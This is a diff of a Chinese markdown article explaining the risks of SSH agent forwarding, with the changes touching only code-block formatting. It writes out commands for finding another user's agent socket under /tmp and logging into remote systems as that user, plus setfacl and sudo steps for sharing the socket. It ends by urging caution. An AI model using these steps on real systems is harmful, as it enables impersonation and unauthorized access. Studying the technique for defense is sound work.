@@ -15,10 +15,8 @@ ssh实现的每一个方式都会提供一种让client向agent请求服务的机
 root用户可以通过该domain socket连接该socket对应的用户能够访问的任何机器，并且是以这个用户的身份。  
 	
 下面是简单的实现方式：
-	
 
-
-```
+    :::bash
 	ls -l /tmp/ssh*      #look for somebody's agent socket
 	/tmp/ssh-CXkd6094:
 	total 24
@@ -29,16 +27,15 @@ root用户可以通过该domain socket连接该socket对应的用户能够访问
 	ssh steve@remotesystem
 
 	remote$                  # Gotcha! Logged in as "steve" user on remote system!
-```
 
 如果没有root权限也没关系，可能你有sudo的权限，同样下面的操作也可以完成相同的目的：  
 
-```
-	ssh -A user@host
-	user@host$ setfacl -m otheruser:x   $(dirname "$SSH_AUTH_SOCK")
-	user@host$ setfacl -m otheruser:rwx "$SSH_AUTH_SOCK"
-	user@host$ sudo su - otheruser
-	otheruser@host$ ssh server
+    :::bash
+	localhost$ ssh -A user@host
+	$ setfacl -m otheruser:x   $(dirname "$SSH_AUTH_SOCK")
+	$ setfacl -m otheruser:rwx "$SSH_AUTH_SOCK"
+	$ sudo su - otheruser
+	$ ssh server
 	otheruser@server$
-```   	
+
 目前没有任何技术手段防止root用户劫持SSH agent socket，所以鉴于安全方面的考虑，慎用ssh angent forwarding.
